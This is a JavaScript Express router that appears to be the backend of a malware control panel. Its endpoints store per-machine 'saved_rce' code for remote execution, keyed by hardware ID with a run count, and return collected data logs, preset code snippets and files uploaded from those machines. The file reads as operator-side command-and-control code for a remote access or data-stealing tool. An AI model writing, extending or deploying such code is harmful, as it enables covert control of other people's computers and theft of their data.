const express = require('express');
const presetCode = require('../../util/preset_code/preset_code');
const fs = require('fs');
const mime = require('mime');

module.exports = (app) => {
    const router = express.Router();

    router.use((req, res, next) => {
        if (req.isAuthenticated()) {
            return next();
        }

        res.status(401).send({ error: 'Unauthorized request.' });
    });

    router.get(`/:hwid/get_saved_rce`, (req, res) => {
        if (req.params.hwid.length != 64) return res.status(400).send({ error: 'Invalid HWID.' });

        const result = app.db.prepare('SELECT * FROM saved_rce WHERE hwid = ?').get(req.params.hwid);

        if (!result) return res.status(200).send({ code: '', timesToRun: 1 });
        else return res.status(200).send({ code: result.code, timesToRun: result.times_to_run });
    });

    router.post(`/:hwid/set_saved_rce`, (req, res) => {
        if (req.params.hwid.length != 64) return res.status(400).send({ error: 'Invalid HWID.' });

        if (req.body.code == undefined || req.body.timesToRun == undefined) return res.status(200).send({ message: 'Invalid paramaters.' });

        const result = app.db.prepare('SELECT * FROM saved_rce WHERE hwid = ?').get(req.params.hwid);

        if (!result) {
            app.db
                .prepare('INSERT INTO saved_rce (hwid, code, times_to_run) VALUES (?, ?, ?)')
                .run(req.params.hwid, req.body.code, req.body.timesToRun);
        } else {
            app.db.prepare('UPDATE saved_rce SET code = ?, times_to_run = ? WHERE hwid = ?').run(req.body.code, req.body.timesToRun, req.params.hwid);
        }

        res.status(200).send({ message: 'Success.' });
    });

    router.get(`/:hwid/get_data/:dataId`, (req, res) => {
        if (req.params.hwid.length != 64) return res.status(400).send({ error: 'Invalid HWID.' });

        const result = app.db.prepare('SELECT * FROM data_logs WHERE hwid = ? AND id = ?').get(req.params.hwid, req.params.dataId);

        res.status(200).send(!result ? '' : result.data);
    });

    router.get(`/get_preset_code/:id`, (req, res) => {
        res.status(200).send(presetCode[req.params.id]);
    });

    router.get(`/download_file/:id/:hwid`, (req, res) => {
        const hwid = req.params.hwid;
        const result = app.db.prepare('SELECT * FROM file_uploads WHERE id = ? AND hwid = ?').get(req.params.id, req.params.hwid);

        if (!result) return res.status(400).send({ error: 'Invalid ID/HWID.' });

        const storedName = result.stored_name;
        const displayName = result.name;

        let mimeType = mime.lookup(displayName);
        if (!mimeType) mimeType = 'text/plain';

        res.setHeader('Content-disposition', 'attachment; filename=' + displayName);
        res.setHeader('Content-type', mimeType);

        fs.createReadStream(`${__dirname}/../../data/files/${storedName}`).pipe(res);
    });

    return router;
};
